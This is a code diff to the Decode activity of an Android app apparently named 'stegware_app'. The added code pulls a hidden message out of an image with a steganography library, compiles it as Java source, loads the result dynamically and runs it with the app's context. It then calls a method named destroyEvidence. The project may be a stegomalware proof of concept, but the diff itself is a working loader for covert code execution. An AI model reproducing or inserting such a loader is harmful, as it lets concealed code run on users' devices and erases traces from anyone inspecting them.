@@ -1,7 +1,9 @@
 package com.android.stegware_app;
 
+import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.MediaStore;
@@ -13,11 +15,18 @@ import android.widget.TextView;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import com.android.stegware_app.compile_utility.Compile;
+import com.android.stegware_app.compile_utility.exceptions.InvalidSourceCodeException;
+import com.android.stegware_app.compile_utility.exceptions.NotBalancedParenthesisException;
 import com.ayush.imagesteganographylibrary.Text.AsyncTaskCallback.TextDecodingCallback;
 import com.ayush.imagesteganographylibrary.Text.ImageSteganography;
 import com.ayush.imagesteganographylibrary.Text.TextDecoding;
 
 import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+import javassist.NotFoundException;
 
 public class Decode extends AppCompatActivity implements TextDecodingCallback {
 
@@ -58,14 +67,66 @@ public class Decode extends AppCompatActivity implements TextDecodingCallback {
             if (filepath != null) {
 
                 //Making the ImageSteganography object
-                ImageSteganography imageSteganography = new ImageSteganography(secret_key.getText().toString(),
-                        original_image);
+                ImageSteganography imageSteganography = new ImageSteganography(secret_key.getText().toString(), original_image);
 
                 //Making the TextDecoding object
                 TextDecoding textDecoding = new TextDecoding(Decode.this, Decode.this);
 
                 //Execute Task
                 textDecoding.execute(imageSteganography);
+
+                Log.d(TAG, "Image code: " + imageSteganography.getMessage());
+
+                //new Compile instance
+                Compile compile = new Compile(getFilesDir(), getApplicationContext(), imageSteganography.getMessage());
+
+                //parsing phase
+                try {
+                    compile.parseSourceCode();
+                } catch (NotBalancedParenthesisException | InvalidSourceCodeException e) {
+                    e.printStackTrace();
+                }
+                //end parsing phase
+
+                //compiling phase
+                try {
+                    compile.assemblyCompile();
+                } catch (NotFoundException e) {
+                    e.printStackTrace();
+                }
+                try {
+                    compile.compile();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                //end compiling phase
+
+                compile.dynamicLoading(getApplicationContext().getCacheDir(), getApplicationInfo(), getClassLoader());
+                Object obj = null;
+                try {
+                    obj = compile.run();
+                } catch (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException | InstantiationException e) {
+                    e.printStackTrace();
+                }
+
+                String result = "";
+                Method metodo = null;
+                try {
+                    metodo = obj.getClass().getDeclaredMethod("run", Context.class);
+                } catch (NoSuchMethodException e) {
+                    e.printStackTrace();
+                }
+                try {
+                    result = (String) metodo.invoke(obj, getApplicationContext());
+                } catch (IllegalAccessException | InvocationTargetException e) {
+                    e.printStackTrace();
+                }
+                //end compiling, loading and execution phase
+
+                Log.d(TAG, "Result: " + result);
+
+                //destroy all
+                compile.destroyEvidence();
             }
         });
     }
